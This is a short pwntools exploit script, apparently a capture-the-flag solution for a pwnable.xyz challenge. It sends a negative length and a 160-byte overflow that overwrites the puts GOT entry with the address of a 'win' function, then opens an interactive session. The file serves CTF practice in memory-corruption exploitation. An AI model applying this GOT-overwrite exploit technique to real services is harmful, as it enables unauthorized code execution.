from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30036)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
a = 0x0000000000610DA0
buf = 0x0000000000610EA0
reverse = 0x0000000000610EC0

def handles(a,b):
	sa('>','3')
	sa('>',str(a))
	sa('>',str(b))

sa('>','5')
sa(':','-1')
p.send('BBBBBBBBBB')

# handles(1,0) # 24
# handles(2,0) # 36
# handles(3,0) # 41
# handles(4,0) # 43
# handles(5,0) # 35

handles(4,0)
handles(4,0)
handles(4,0)
handles(4,0)
handles(4,0)
handles(3,0)

sa('>','5')
p.send('A'*160+p64(e.got['puts']))

sa('>','5')
p.send(p64(e.symbols['win']))

sa('>','777')

p.interactive()